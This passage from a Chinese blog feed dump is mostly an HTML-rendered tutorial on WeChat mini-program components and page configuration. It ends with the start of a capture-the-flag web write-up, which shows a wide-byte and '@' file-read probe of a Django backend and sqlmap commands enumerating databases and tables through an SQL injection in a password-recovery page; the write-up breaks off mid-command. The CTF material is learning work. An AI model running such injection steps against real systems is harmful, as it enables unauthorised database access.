class="string">&#x27;https://images.unsplash.com/photo-1551214012-84f95e060dee?w=640&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;https://images.unsplash.com/photo-1551446591-142875a901a1?w=640&#x27;</span></span><br><span class="line">],</span><br><span class="line"><span class="attr">interval</span>: <span class="number">5000</span>,</span><br><span class="line"><span class="attr">duration</span>: <span class="number">1000</span>,</span><br><span class="line"><span class="attr">indicatorDots</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">indicatorColor</span>: <span class="string">&quot;#ffffff&quot;</span>,</span><br><span class="line"><span class="attr">activecolor</span>:<span class="string">&quot;#2971f6&quot;</span>,</span><br><span class="line"><span class="attr">autoplay</span>: <span class="literal">true</span>,</span><br></pre></td></tr></table></figure><p>要构成一个完整的轮播需要满足：</p><p>1.配置<strong>相同尺寸规格的图片</strong></p><p>2.配置轮播时的面板指示点、动画效果、是否自动播放等</p><h3 id="0x002-audio组件-音乐列表"><a href="#0x002-audio组件-音乐列表" class="headerlink" title="0x002 audio组件(音乐列表)"></a>0x002 audio组件(音乐列表)</h3><p>audio组件是音频组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;musicinfo.src&#125;&#125;&quot;</span> <span class="attr">poster</span>=<span class="string">&quot;&#123;&#123;musicinfo.poster&#125;&#125;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&#123;&#123;musicinfo.name&#125;&#125;&quot;</span> <span class="attr">author</span>=<span class="string">&quot;&#123;&#123;musicinfo.author&#125;&#125;&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">musicinfo</span>: &#123;</span><br><span class="line">     <span class="attr">poster</span>: <span class="string">&#x27;http://y.gtimg.cn/music/photo_new/T002R300x300M000003rsKF44GyaSk.jpg?max_age=2592000&#x27;</span>,</span><br><span class="line">     <span class="attr">name</span>: <span class="string">&#x27;此时此刻&#x27;</span>,</span><br><span class="line">     <span class="attr">author</span>: <span class="string">&#x27;许巍&#x27;</span>,</span><br><span class="line">     <span class="attr">src</span>: <span class="string">&#x27;http://ws.stream.qqmusic.qq.com/M500001VfvsJ21xFqb.mp3?guid=ffffffff82def4af4b12b3cd9337d5e7&amp;uin=346897220&amp;vkey=6292F51E1E384E06DCBDC9AB7C49FD713D632D313AC4858BACB8DDD29067D3C601481D36E62053BF8DFEAF74C0A5CCFADD6471160CAF3E6A&amp;fromtag=46&#x27;</span>,</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>audio组件：</p><ul><li>src：要播放音频的资源地址</li><li>poster：默认控件上的音频封面的图片资源地址</li><li>name：默认控件上的音频名字</li><li>author：默认控件上的作者名字</li></ul><p>可能由于audio组件使用的场景和频次都非常低，audio组件以后就要被抛弃了，需要用到小程序的API来创建音乐播放。</p><h3 id="0x003-video组件"><a href="#0x003-video组件" class="headerlink" title="0x003 video组件"></a>0x003 video组件</h3><p>video组件用来表示视频</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">id</span>=<span class="string">&quot;daxueVideo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://wxsnsdy.tc.qq.com/105/20210/snsdyvideodownload?filekey=30280201010421301f0201690402534804102ca905ce620b1241b726bc41dcff44e00204012882540400&amp;bizid=1023&amp;hy=SH&amp;fileparam=302c020101042530230204136ffd93020457e3c4ff02024ef202031e8d7f02030f42400204045a320a0201000400&quot;</span> <span class="attr">autoplay</span> <span class="attr">loop</span> <span class="attr">muted</span> <span class="attr">initial-time</span>=<span class="string">&quot;100&quot;</span> <span class="attr">controls</span> <span class="attr">event-model</span>=<span class="string">&quot;bubble&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>video组件：</p><ul><li>autoplay：是否自动播放</li><li>loop：是否循环播放</li><li>muted：是否静音播放</li><li>inital-time：指定视频初始播放位置，单位是秒</li><li>controls：是否显示默认播放控件</li></ul><h3 id="0x004-cover效果"><a href="#0x004-cover效果" class="headerlink" title="0x004 cover效果"></a>0x004 cover效果</h3><p>可以把view、图片组件覆盖在地图map或视频video组件之上</p><p>适用条件情况：</p><p>希望在视频的左上角显示视频的标题以及在右上角显示商家的logo，就可以使用cover效果。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">id</span>=<span class="string">&quot;daxueVideo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://wxsnsdy.tc.qq.com/105/20210/snsdyvideodownload?filekey=30280201010421301f0201690402534804102ca905ce620b1241b726bc41dcff44e00204012882540400&amp;bizid=1023&amp;hy=SH&amp;fileparam=302c020101042530230204136ffd93020457e3c4ff02024ef202031e8d7f02030f42400204045a320a0201000400&quot;</span> <span class="attr">controls</span> <span class="attr">event-model</span>=<span class="string">&quot;bubble&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;covertext&quot;</span>&gt;</span>腾讯大学：腾讯特色学习交流平台<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;coverimg&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://imgcache.qq.com/open_proj/proj_qcloud_v2/gateway/portal/css/img/nav/logo-bg-color.svg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.covertext</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">500</span>rpx;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>:<span class="number">20</span>rpx;</span><br><span class="line">  <span class="attribute">left</span>:<span class="number">10</span>rpx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.coverimg</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">100</span>rpx;<span class="attribute">height</span>:<span class="number">23</span>rpx;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">right</span>:<span class="number">10</span>rpx;</span><br><span class="line">  <span class="attribute">top</span>:<span class="number">10</span>rpx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x005-地图组件"><a href="#0x005-地图组件" class="headerlink" title="0x005 地图组件"></a>0x005 地图组件</h3><p>要想在地图上标记一个地点，首先我们需要知道该地点的经纬度，这个时候就需要使用到坐标拾取器的工具。</p><p><strong>经纬度获取：</strong><a href="https://lbs.qq.com/tool/getpoint/index.html">腾讯地图坐标拾取器</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;myMap&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;width: 100%; height: 300px;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">latitude</span>=<span class="string">&quot;&#123;&#123;latitude&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">longitude</span>=<span class="string">&quot;&#123;&#123;longitude&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">markers</span>=<span class="string">&quot;&#123;&#123;markers&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">covers</span>=<span class="string">&quot;&#123;&#123;covers&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">show-location</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">latitude</span>: <span class="number">22.540503</span>,</span><br><span class="line"><span class="attr">longitude</span>: <span class="number">113.934528</span>,</span><br><span class="line"><span class="attr">markers</span>: [&#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">latitude</span>: <span class="number">22.540503</span>,</span><br><span class="line">  <span class="attr">longitude</span>: <span class="number">113.934528</span>,</span><br><span class="line">  <span class="attr">title</span>: <span class="string">&#x27;深圳腾讯大厦&#x27;</span></span><br><span class="line">&#125;],</span><br></pre></td></tr></table></figure><p><strong>在地图上标记多个点</strong></p><p>markers标记点用于在地图上显示标记的位置，它的<strong>数据类型</strong>是<strong>Array数组</strong></p><p>在markers里多添加几个坐标：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">markers</span>: [</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">     <span class="attr">latitude</span>: <span class="number">22.540503</span>,</span><br><span class="line">     <span class="attr">longitude</span>: <span class="number">113.934528</span>,</span><br><span class="line">     <span class="attr">title</span>: <span class="string">&#x27;深圳腾讯大厦&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">       <span class="attr">latitude</span>: <span class="number">22.540576</span>,</span><br><span class="line">       <span class="attr">longitude</span>: <span class="number">113.933790</span>,</span><br><span class="line">       <span class="attr">title</span>: <span class="string">&#x27;万利达科技大厦&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">3</span>,</span><br><span class="line">       <span class="attr">latitude</span>: <span class="number">22.522807</span>,</span><br><span class="line">       <span class="attr">longitude</span>: <span class="number">113.935338</span>,</span><br><span class="line">       <span class="attr">title</span>: <span class="string">&#x27;深圳腾讯滨海大厦&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">4</span>,</span><br><span class="line">       <span class="attr">latitude</span>: <span class="number">22.547400</span>,</span><br><span class="line">       <span class="attr">longitude</span>: <span class="number">113.944370</span>,</span><br><span class="line">       <span class="attr">title</span>: <span class="string">&#x27;腾讯C2&#x27;</span></span><br><span class="line">     &#125;,    </span><br><span class="line">   ],</span><br></pre></td></tr></table></figure><p>除了marker，还有以下属性:</p><ul><li>callout:点击marker出现气泡callout、以及气泡上的label，可以丰富点击地图标记弹出丰富的信息介绍；</li><li>circle：在地图上显示圆，比如用于显示方圆几公里，或者权重大小在地图的可视化</li><li>polygon：指定一系列坐标点，根据 points 坐标数据生成闭合多边形,，比如圈出实际的范围</li><li>polyline：指定一系列坐标点，从数组第一项连线至最后一项，比如跑步的路线</li></ul><h2 id="0x08-优化部署上线"><a href="#0x08-优化部署上线" class="headerlink" title="0x08 优化部署上线"></a>0x08 优化部署上线</h2><h3 id="0x001-小程序的转发功能"><a href="#0x001-小程序的转发功能" class="headerlink" title="0x001 小程序的转发功能"></a>0x001 小程序的转发功能</h3><p>只需要在小程序每个页面的js文件下的Page({ }） 里面，添加以下代码，小程序就有转发功能了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">onShareAppMessage</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.<span class="property">from</span> === <span class="string">&#x27;button&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 来自页面内转发按钮</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">target</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;云开发技术训练营&#x27;</span>,</span><br><span class="line">            <span class="attr">path</span>: <span class="string">&quot;pages/home/home,</span></span><br><span class="line"><span class="string">            imageUrl:&quot;</span><span class="attr">https</span>:<span class="comment">//hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;,</span></span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">                <span class="comment">// 转发成功</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">fail</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">                <span class="comment">// 转发失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><ul><li>title为转发的标题，如果不填，默认为当前小程序的名称；</li><li>path为当前页面路径，也可以为其他页面的路径，如果路径写错的话会显示“当前页面不存在”哦。</li><li>imageUrl为自定义图片路径，可以是本地文件路径或网络图片路径。支持PNG及JPG。显示图片长宽比是 5:4。如果不填写会取当前页面，从顶部开始，高度为 80% 屏幕宽度的图像作为转发图片</li></ul><h3 id="0x002-小程序配置的细节"><a href="#0x002-小程序配置的细节" class="headerlink" title="0x002 小程序配置的细节"></a>0x002 小程序配置的细节</h3><h4 id="0x0001-没有tabBar的小程序"><a href="#0x0001-没有tabBar的小程序" class="headerlink" title="0x0001 没有tabBar的小程序"></a>0x0001 没有tabBar的小程序</h4><p>删掉app.json的tabBar配置项即可。</p><h4 id="0x0002-下拉小程序不出现空白"><a href="#0x0002-下拉小程序不出现空白" class="headerlink" title="0x0002 下拉小程序不出现空白"></a>0x0002 下拉小程序不出现空白</h4><p>当下拉很多小程序的时候，都会出现一个白色的空白，很影响美观，但是如果在windows的配置项里把<strong>backgroundColor</strong>和<strong>navigationBarBackgroundColor</strong>的颜色配置成一样，下拉就不会有空白，比如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;window&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;backgroundTextStyle&quot;</span><span class="punctuation">:</span><span class="string">&quot;light&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;navigationBarBackgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1772cb&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;navigationBarTitleText&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HackWork技术工坊&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;navigationBarTextStyle&quot;</span><span class="punctuation">:</span><span class="string">&quot;white&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;backgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1772cb&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><h4 id="0x0003-让整个页面背景变色"><a href="#0x0003-让整个页面背景变色" class="headerlink" title="0x0003 让整个页面背景变色"></a>0x0003 让整个页面背景变色</h4><p>可以通过直接设置page的样式来设置，在该页面的wxss文件里添加如下样式:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#1772cb</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x0004-禁止页面下拉"><a href="#0x0004-禁止页面下拉" class="headerlink" title="0x0004 禁止页面下拉"></a>0x0004 禁止页面下拉</h4><p>适用情况：做的比较短</p><p>目的：增强用户体验，不希望用户可以下拉页面，因为下拉页面会有种页面松动的感觉</p><p>做法：可以在该页面的json文件里配置</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;window&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;disableScroll&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="0x003-自定义顶部导航栏"><a href="#0x003-自定义顶部导航栏" class="headerlink" title="0x003 自定义顶部导航栏"></a>0x003 自定义顶部导航栏</h3><p>适用情况：官方默认的导航栏只能对背景颜色进行更改，想要在导航栏添加一些比较酷炫的效果</p><p>做法：通过自定义导航栏实现，通过设置 app.json中页面配置的 navigationStyle(导航栏样式)配置项的值为 custom，即可实现自定义导航：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;window&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;navigationStyle&quot;</span><span class="punctuation">:</span><span class="string">&quot;custom&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>给小程序的页面配一个好看的壁纸,home.wxss</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page&#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">https://tcb-1251009918.cos.ap-guangzhou.myqcloud.com/background.jpg</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x004-模板"><a href="#0x004-模板" class="headerlink" title="0x004 模板"></a>0x004 模板</h3><p>适用情况：希望<strong>所有的页面</strong>都有一个相同的底部版权信息</p><p>做法：</p><h4 id="0x0001-静态的页面片段"><a href="#0x0001-静态的页面片段" class="headerlink" title="0x0001 静态的页面片段"></a>0x0001 静态的页面片段</h4><p>使用开发者工具在小程序的pages页面新建一个common文件夹，在common里新建一个foot.wxml，并输入以下代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;foot&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-foot&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;index-desc&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;font-size:12px;bottom:20rpx;position:absolute;bottom:20rpx;width:100%&quot;</span>&gt;</span>云开发技术训练营<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在要引入的页面比如home.wxml的顶部，使用<strong>import</strong>引入这个模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">src</span>=<span class="string">&quot;/pages/common/foot.wxml&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>然后在要显示的地方调用比如home.wmxl页面代码的最底部来调用这个模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">is</span>=<span class="string">&quot;foot&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="0x0002-动态的页面片段"><a href="#0x0002-动态的页面片段" class="headerlink" title="0x0002 动态的页面片段"></a>0x0002 动态的页面片段</h4><p>在页面的每一页都有一个相似的页面样式与结果，但是不同的页面有着不同的标题以及页面描述，用数据绑定就能很好的解决这个问题，不同的页面的js data里有不同的数据，而模板的wxml都是固定的框架。</p><p>使用开发者工具在小程序的pages页面新建一个common文件夹，在common里新建一个head.wxml，并输入以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;head&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-head&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-head-title&quot;</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page-head-line&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:if</span>=<span class="string">&quot;&#123;&#123;desc&#125;&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;page-head-desc&quot;</span>&gt;</span>&#123;&#123;desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再给每个页面的js里的data里添加不同的title和desc信息，再来在页面先引入head.wxml，然后在指定的位置比如wxml代码的前面调用该模板。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">src</span>=<span class="string">&quot;/pages/common/head.wxml&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">is</span>=<span class="string">&quot;foot&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>注意创建模板时，使用的是<code>&lt;template name=&quot;模板名&quot;&gt;&lt;/template&gt;</code>，而调用模板时，使用的是<code>&lt;template is=&quot;模板名&quot; /&gt;</code>，两者之间对应。</p><h3 id="0x005-小程序的客服"><a href="#0x005-小程序的客服" class="headerlink" title="0x005 小程序的客服"></a>0x005 小程序的客服</h3><p>适用情况：开发者在小程序内添加客服消息按钮组件，用户就可在小程序内唤起客服会话页面，给小程序发消息。而开发者（可绑定其他运营人员）也可以直接使用<a href="https://mpkf.weixin.qq.com/">微信公众平台网页版客服工具</a>或者移动端小程序客服小助手进行客服消息回复</p><p>做法：</p><p>在wxml文件里添加如下代码，即可唤起客服会话页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">open-type</span>=<span class="string">&quot;contact&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x006-web-view"><a href="#0x006-web-view" class="headerlink" title="0x006 web-view"></a>0x006 web-view</h3><p>承载网页的容器。会自动铺满整个小程序页面，<strong>个人类型的小程序暂不支持使用。</strong></p><p>web-view组件可<strong>打开关联的公众号的文章</strong></p><p>适用于自媒体用户</p><p>公众号文章可以使用第三方的工具比如秀米</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-view</span> <span class="attr">src</span>=<span class="string">&quot;https://mp.weixin.qq.com/cgi-bin/wx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">web-view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>web-view的也可以绑定备案好的域名，支持JSSDK的接口，因此很有小程序为了省开发成本，点击链接打开的都是网页，并没有做小程序的原生开发，这个就不再讨论范围之内了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF WEB Advanced</title>
      <link href="/2020/02/12/XCTF-WEB-Advanced/"/>
      <url>/2020/02/12/XCTF-WEB-Advanced/</url>
      
        <content type="html"><![CDATA[<h2 id="cat-抓住那只猫"><a href="#cat-抓住那只猫" class="headerlink" title="cat:抓住那只猫"></a>cat:抓住那只猫</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575112554428-a11f51c8-7284-4b2d-931b-7305e0dc7e63.png" alt="image.png"><br />在输入任何网站都无效的情况下，输入localhost<br /><img src="https://cdn.nlark.com/yuque/0/2019/png/283368/1575112604627-3d81eb2c-c7b8-45da-98e8-8b9750f90e59.png" alt="image.png"><br />发现还是有回显的，进行Fuzz测试发现@未被过滤，会将@编码为%40<br />试一试宽字节，%bf<br /><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575112743182-0eea4b5f-897a-4030-a945-dec36c0116b3.png" alt="image.png"><br />发现是一些HTML网页代码，带着好奇心，我打开了PHPSTUDY进行本地测试<br /><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575112796316-97270c0c-cdb5-4603-b371-aa0d06ee954c.png" alt="image.png"><br />看到了熟悉的django报错页面，看来是将输入的参数传到了后端的django服务中进行解析，而django设置了编码为gbk导致错误编码了宽字符（超过了ascii码范围）。<br />看了一下大佬的WP发现@的作用是读取文件内容</p><p><a name="Nz8qN"></a></p><h2 id="ics-04"><a href="#ics-04" class="headerlink" title="ics-04"></a>ics-04</h2><p>有三个可以访问的功能，注册、登录和找回密码<br />注册功能：没有sql注入，一个账号可以重复注册漏洞<br />登录功能：没有sql注入，一个账号不同密码能够登录<br />找回密码功能：存在sql注入，payload：<br />![A2&#96;Y[TM(NN{(E]ICSQEHDBG.png](<a href="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1576416559902-5f3c283d-4f95-4dad-9d07-473c685cb6d1.png">https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1576416559902-5f3c283d-4f95-4dad-9d07-473c685cb6d1.png</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot;</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; --dbs</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 --tables</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 